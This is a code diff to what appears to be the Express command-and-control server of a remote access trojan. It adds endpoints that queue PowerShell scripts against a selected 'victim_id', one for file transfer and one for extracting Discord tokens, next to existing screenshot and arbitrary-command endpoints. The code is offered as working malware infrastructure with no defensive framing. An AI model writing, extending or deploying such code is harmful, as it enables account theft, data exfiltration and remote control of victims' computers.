@@ -123,6 +123,44 @@ app.post("/send_screenshot", (req, res) => {
   res.sendStatus(200);
 });
 
+app.post("/send_file_transfer", (req, res) => {
+  const { victim_id } = req.body;
+  const identity = idToIdentity.get(victim_id);
+  if (!identity) return res.status(400).send("Invalid victim ID");
+
+  const scriptPath = path.join(__dirname, "programs", "filetransfer", "FileTransfer.ps1");
+  let command;
+  try {
+    command = fs.readFileSync(scriptPath, "utf8");
+  } catch (err) {
+    console.error("Failed to read FileTransfer.ps1:", err);
+    return res.status(500).send("Failed to load filetransfer script");
+  }
+
+  commandQueue.get(identity).push(command);
+  console.log(`[Dashboard] Sent screenshot command to ${victim_id}`);
+  res.sendStatus(200);
+});
+
+app.post("/send_discord_token_extract", (req, res) => {
+  const { victim_id } = req.body;
+  const identity = idToIdentity.get(victim_id);
+  if (!identity) return res.status(400).send("Invalid victim ID");
+
+  const scriptPath = path.join(__dirname, "programs", "discordtokens", "DiscordExtract.ps1");
+  let command;
+  try {
+    command = fs.readFileSync(scriptPath, "utf8");
+  } catch (err) {
+    console.error("Failed to read DiscordExtract.ps1:", err);
+    return res.status(500).send("Failed to load DiscordExtract script");
+  }
+
+  commandQueue.get(identity).push(command);
+  console.log(`[Dashboard] Sent discord token extraction command to ${victim_id}`);
+  res.sendStatus(200);
+});
+
 // Dashboard send command to victim
 app.post("/send_command", (req, res) => {
   const { victim_id, command } = req.body;
